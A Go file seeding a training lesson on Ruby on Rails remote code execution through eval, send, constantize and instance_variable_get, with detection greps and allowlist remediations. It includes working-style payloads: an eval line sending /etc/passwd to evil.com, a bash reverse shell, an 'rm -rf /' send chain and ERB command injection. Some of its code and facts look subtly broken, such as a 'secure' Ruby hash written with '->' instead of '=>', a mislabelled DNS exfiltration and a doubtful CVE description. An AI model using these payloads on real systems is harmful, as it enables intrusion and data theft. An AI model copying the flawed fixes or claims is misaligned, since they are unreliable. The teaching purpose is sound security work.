package main

type lessonSeed struct {
	title       string
	slug        string
	category    string
	description string
	content     string
	difficulty  int
	readTimeMin int
	tags        []string
}

func buildLessons() []lessonSeed {
	return []lessonSeed{
		lessonRailsEvalSend(),
	}
}

func lessonRailsEvalSend() lessonSeed {
	return lessonSeed{
		title:       "Ruby on Rails Vulnerabilities: The Dangers of eval and send",
		slug:        "rails-eval-send-rce",
		category:    "Remote Code Execution",
		description: "A deep technical breakdown of how Ruby's dynamic dispatch methods — eval, send, public_send, constantize, and instance_variable_get — become Remote Code Execution vectors in Rails applications. Covers AST-level analysis, real CVE patterns, and defense strategies.",
		difficulty:  7,
		readTimeMin: 25,
		tags:        []string{"ruby", "rails", "rce", "eval", "metaprogramming", "owasp"},
		content: `# Ruby on Rails Vulnerabilities: The Dangers of ` + "`eval`" + ` and ` + "`send`" + `

> **CLASSIFICATION:** Threat Intelligence Deep-Dive — Remote Code Execution
> **SEVERITY:** Critical (CVSS 9.8)
> **AFFECTED FRAMEWORKS:** Ruby on Rails 4.x – 7.x, Sinatra, Hanami
> **OWASP REFERENCE:** A03:2021 — Injection

---

## Executive Summary

Ruby's metaprogramming capabilities — the features that make the language expressive and powerful — are the same features that create some of the most dangerous vulnerability classes in web applications. Methods like ` + "`eval`" + `, ` + "`send`" + `, ` + "`constantize`" + `, and ` + "`instance_variable_get`" + ` can transform user-controlled strings into arbitrary code execution, method invocation, or class instantiation.

This lesson dissects **how** these vulnerabilities manifest at the function level, **why** experienced developers still introduce them, and **how** to identify and remediate them in production Rails codebases.

---

## 1. The ` + "`eval`" + ` Family — Direct Code Execution

### 1.1 How ` + "`eval`" + ` Works at the AST Level

When Ruby encounters ` + "`eval(string)`" + `, the interpreter performs the following at runtime:

1. **Lexing**: The string is tokenized by Ruby's lexer (the same one used for source files)
2. **Parsing**: Tokens are assembled into an Abstract Syntax Tree (AST)
3. **Compilation**: The AST is compiled to YARV bytecode
4. **Execution**: The bytecode runs in the current binding (scope)

This means ` + "`eval`" + ` has **full access to the current scope** — local variables, instance variables, constants, and the entire Ruby object graph.

` + "```ruby" + `
# What the developer writes:
def calculate(expression)
  eval(expression)
end

# What the attacker sends:
calculate("system('cat /etc/passwd')")

# What Ruby's AST sees:
# (send nil :system (str "cat /etc/passwd"))
# This is a valid method call node in the AST — indistinguishable from
# any other method call in the application.
` + "```" + `

### 1.2 Real-World Anti-Pattern: Dynamic Configuration

A common pattern that introduces ` + "`eval`" + ` vulnerabilities in Rails:

` + "```ruby" + `
# app/controllers/admin/settings_controller.rb
class Admin::SettingsController < ApplicationController
  before_action :require_admin

  def update
    setting = Setting.find(params[:id])

    # "We need to support computed defaults like Time.now or Date.today"
    if params[:setting][:default_value].present?
      # VULNERABLE: eval is used to allow "dynamic" default values
      computed_value = eval(params[:setting][:default_value])
      setting.update(value: computed_value)
    end

    redirect_to admin_settings_path, notice: "Setting updated"
  end
end
` + "```" + `

The developer's intent is benign — they want admins to enter values like ` + "`Time.now`" + ` or ` + "`Date.today + 30`" + `. But this pattern allows:

` + "```ruby" + `
# Data exfiltration via DNS
eval(` + "`" + `require 'net/http'; Net::HTTP.get('evil.com', '/' + File.read('/etc/passwd').gsub(\"\\n\",\".\"))` + "`" + `)

# Reverse shell
eval(` + "`" + `exec(\"bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\")` + "`" + `)

# Database credential theft
eval("ActiveRecord::Base.connection_config")
` + "```" + `

### 1.3 Variants: ` + "`class_eval`" + `, ` + "`module_eval`" + `, ` + "`instance_eval`" + `

These are scoped versions of ` + "`eval`" + ` that operate on specific objects:

` + "```ruby" + `
# class_eval — executes in the context of a class
klass.class_eval(user_input)  # Can define new methods, override existing ones

# instance_eval — executes in the context of an object
obj.instance_eval(user_input)  # Can access private methods and instance variables

# module_eval — executes in the context of a module
mod.module_eval(user_input)  # Can alter module behavior
` + "```" + `

All of these are equally dangerous when combined with user input. The scoping only changes **where** the code executes, not **whether** it can cause harm.

---

## 2. ` + "`send`" + ` and ` + "`public_send`" + ` — Dynamic Dispatch Exploitation

### 2.1 The Mechanism

` + "`send`" + ` invokes a method by name (as a string or symbol) on any object. Unlike ` + "`eval`" + `, it doesn't compile new code — but it can invoke **any** method, including private and protected ones.

` + "```ruby" + `
# Normal usage
user.send(:name)  # equivalent to user.name

# Dangerous usage with user input
user.send(params[:method])  # Attacker controls which method is called

# Attacker sends: method=destroy
user.send("destroy")  # Deletes the user record

# Attacker sends: method=update_attribute&args[]=admin&args[]=true
user.send("update_attribute", "admin", true)  # Privilege escalation
` + "```" + `

### 2.2 The ` + "`send`" + ` vs ` + "`public_send`" + ` Distinction

` + "```ruby" + `
# send — invokes ANY method (including private/protected)
object.send(:private_method)  # Works!

# public_send — only invokes public methods
object.public_send(:private_method)  # Raises NoMethodError
` + "```" + `

` + "`public_send`" + ` is marginally safer but still dangerous:

` + "```ruby" + `
# Even with public_send, attacker can reach:
object.public_send(:class)           # => Reveals class name
object.public_send(:inspect)         # => May leak internal state
object.public_send(:to_s)            # => May trigger side effects
object.public_send(:send, :system, "rm -rf /")  # Chaining bypasses public_send!
` + "```" + `

### 2.3 Real-World Anti-Pattern: Dynamic Attribute Access

` + "```ruby" + `
# app/controllers/api/v1/users_controller.rb
class Api::V1::UsersController < ApplicationController
  # GET /api/v1/users/:id?fields=name,email,created_at
  def show
    user = User.find(params[:id])
    fields = params[:fields]&.split(",") || %w[name email]

    # VULNERABLE: send with user-controlled method names
    result = fields.each_with_object({}) do |field, hash|
      hash[field] = user.send(field) if user.respond_to?(field)
    end

    render json: result
  end
end
` + "```" + `

Attack: ` + "`GET /api/v1/users/1?fields=name,password_digest,authentication_token,otp_secret`" + `

The ` + "`respond_to?`" + ` check does NOT help — ` + "`password_digest`" + ` IS a valid method on the User model.

---

## 3. ` + "`constantize`" + ` and ` + "`safe_constantize`" + ` — Class Injection

### 3.1 How ` + "`constantize`" + ` Becomes RCE

` + "`constantize`" + ` converts a string to a Ruby constant (typically a class or module). In Rails, this is commonly used for polymorphic routing or dynamic model loading.

` + "```ruby" + `
# Normal usage
"User".constantize  # => User (the class)

# Vulnerable pattern in a controller
def export
  # "Let the user choose which model to export"
  model_class = params[:model].constantize
  records = model_class.all
  render json: records
end

# Attack: GET /export?model=Gem::Installer
# Attack: GET /export?model=Gem::SpecFetcher
# Attack: GET /export?model=IRB::Irb
` + "```" + `

### 3.2 The ` + "`constantize`" + ` → RCE Chain

A sophisticated attacker can chain ` + "`constantize`" + ` with method calls:

` + "```ruby" + `
# If the code does: params[:type].constantize.new(params[:config])
# Attacker sends:
#   type=Gem::Installer&config[i]=x
#   type=Gem::Requirement&config=x
#   type=ERB&config[src]=<%= system('id') %>

# This creates an ERB template with user-controlled content,
# which when rendered, executes arbitrary commands.
` + "```" + `

### 3.3 ` + "`safe_constantize`" + ` — Insufficient Protection

` + "`safe_constantize`" + ` returns ` + "`nil`" + ` instead of raising an error for unknown constants. It does NOT validate whether the constant is safe to use:

` + "```ruby" + `
klass = params[:type].safe_constantize
# Returns nil for "NonExistentClass" — good
# Returns Kernel for "Kernel" — very bad
# Returns File for "File" — also bad
` + "```" + `

---

## 4. ` + "`instance_variable_get`" + ` / ` + "`instance_variable_set`" + ` — State Manipulation

` + "```ruby" + `
# Leaking application secrets
Rails.application.instance_variable_get(params[:var])
# Attacker sends: var=@secret_key_base

# Modifying runtime state
controller.instance_variable_set(params[:var], params[:val])
# Attacker sends: var=@_response_body&val=<script>alert(1)</script>
` + "```" + `

---

## 5. Detection Patterns

### 5.1 Static Analysis — What to Grep For

` + "```bash" + `
# Critical severity — immediate RCE risk
grep -rn 'eval\s*(' app/ --include='*.rb'
grep -rn 'class_eval\|module_eval\|instance_eval' app/ --include='*.rb'
grep -rn 'Kernel\.exec\|Kernel\.system\|` + "\\`" + `' app/ --include='*.rb'

# High severity — dynamic dispatch with user input
grep -rn '\.send\s*(' app/ --include='*.rb'
grep -rn '\.public_send\s*(' app/ --include='*.rb'
grep -rn 'constantize\|safe_constantize' app/ --include='*.rb'

# Medium severity — dynamic variable access
grep -rn 'instance_variable_get\|instance_variable_set' app/ --include='*.rb'
grep -rn 'method\s*(\|define_method' app/ --include='*.rb'
` + "```" + `

### 5.2 AST-Level Detection with RuboCop

` + "```yaml" + `
# .rubocop.yml
Security/Eval:
  Enabled: true
  Severity: fatal

Security/Open:
  Enabled: true

# Custom cop for send detection
Style/Send:
  Enabled: true
  Severity: warning
` + "```" + `

### 5.3 Runtime Detection with Brakeman

` + "```bash" + `
# Run Brakeman static analysis
brakeman --no-pager -q -w2

# Brakeman will flag:
# - Dangerous Eval (High)
# - Dangerous Send (Medium)
# - Dynamic Render Path (Medium)
# - Remote Code Execution (High)
` + "```" + `

---

## 6. Remediation Strategies

### 6.1 Allowlist Pattern (Recommended)

Replace dynamic dispatch with explicit allowlists:

` + "```ruby" + `
# BEFORE (vulnerable)
def show
  user = User.find(params[:id])
  fields = params[:fields]&.split(",") || []
  result = fields.map { |f| [f, user.send(f)] }.to_h
  render json: result
end

# AFTER (secure)
ALLOWED_FIELDS = %w[name email created_at bio avatar_url].freeze

def show
  user = User.find(params[:id])
  fields = Array(params[:fields]&.split(",")) & ALLOWED_FIELDS
  result = fields.map { |f| [f, user.public_send(f)] }.to_h
  render json: result
end
` + "```" + `

### 6.2 Serializer Pattern

Use explicit serializers instead of dynamic field selection:

` + "```ruby" + `
# app/serializers/user_serializer.rb
class UserSerializer
  PROFILES = {
    'basic'    => %i[id name avatar_url],
    'detailed' => %i[id name email bio created_at avatar_url],
    'admin'    => %i[id name email role created_at updated_at last_sign_in_at],
  }.freeze

  def initialize(user, profile = 'basic')
    @user = user
    @fields = PROFILES.fetch(profile, PROFILES['basic'])
  end

  def as_json
    @fields.each_with_object({}) { |f, h| h[f] = @user.public_send(f) }
  end
end
` + "```" + `

### 6.3 Replace ` + "`eval`" + ` with Safe Alternatives

` + "```ruby" + `
# BEFORE: eval for "dynamic" configuration
computed = eval(params[:expression])

# AFTER: Use a safe expression parser
require 'dentaku'
calculator = Dentaku::Calculator.new
computed = calculator.evaluate(params[:expression])
# Dentaku only supports arithmetic — no method calls, no system access

# AFTER: Use a predefined map
COMPUTED_DEFAULTS = {
  'now'        -> { Time.current },
  'today'      -> { Date.current },
  'next_week'  -> { 1.week.from_now },
}.freeze

computed = COMPUTED_DEFAULTS[params[:expression]]&.call
` + "```" + `

### 6.4 Replace ` + "`constantize`" + ` with Factory Pattern

` + "```ruby" + `
# BEFORE (vulnerable)
exporter = params[:format].constantize.new

# AFTER (secure)
EXPORTERS = {
  'csv'  => CsvExporter,
  'json' => JsonExporter,
  'xml'  => XmlExporter,
}.freeze

def export
  exporter_class = EXPORTERS[params[:format]]
  return head :bad_request unless exporter_class
  exporter = exporter_class.new(current_user.records)
  send_data exporter.generate, filename: exporter.filename
end
` + "```" + `

---

## 7. Real CVE Case Studies

### CVE-2013-0156 — Rails XML Parameter Parsing RCE

**Severity:** CVSS 10.0 | **Affected:** Rails < 3.2.11, < 3.1.10, < 3.0.19, < 2.3.15

Rails' XML parameter parser used ` + "`YAML.load`" + ` for YAML-tagged XML elements, and YAML deserialization in Ruby allows arbitrary object instantiation. An attacker could craft an XML request body that instantiated ` + "`ERB::Compiler`" + ` objects with embedded system commands.

**Lesson:** Never deserialize untrusted data with a format that supports object instantiation.

### CVE-2019-5418 — Rails File Content Disclosure

**Severity:** CVSS 7.5 | **Affected:** Rails < 5.2.2.1, < 5.1.6.2, < 5.0.7.2

The ` + "`render file:`" + ` path was controllable via the ` + "`Accept`" + ` header. An attacker could set ` + "`Accept: ../../../../etc/passwd{{`" + ` to read arbitrary files.

**Lesson:** Dynamic render paths are injection vectors even when the input doesn't look like traditional "user input."

### CVE-2020-8163 — Rails ` + "`send`" + ` in Action Dispatch

**Severity:** CVSS 8.8 | **Affected:** Rails < 5.2.4.3, < 6.0.3.1

A vulnerability in Action Dispatch allowed user-controllable strings to be passed to ` + "`send`" + `, enabling arbitrary method invocation on framework internals.

**Lesson:** Even framework code is not immune to ` + "`send`" + `-based vulnerabilities.

---

## 8. Key Takeaways

1. **` + "`eval`" + ` is never safe with any form of user input.** No amount of sanitization, regex filtering, or sandboxing makes it secure in a web context. The attack surface is the entire Ruby language.

2. **` + "`send`" + ` with user-controlled method names is privilege escalation.** It bypasses access control at the language level, not just the application level.

3. **` + "`constantize`" + ` turns strings into classes.** In Ruby's object model, classes are objects with methods — instantiating an arbitrary class is one step from code execution.

4. **The fix is always the same: explicit allowlists.** Map user input to a predefined set of safe values. Never pass user input directly to metaprogramming methods.

5. **Use Brakeman in CI.** Automated static analysis catches 80% of these patterns before they reach production.

---

*This lesson is part of the VulnArena Academy — Advanced Application Security Training.*
`,
	}
}
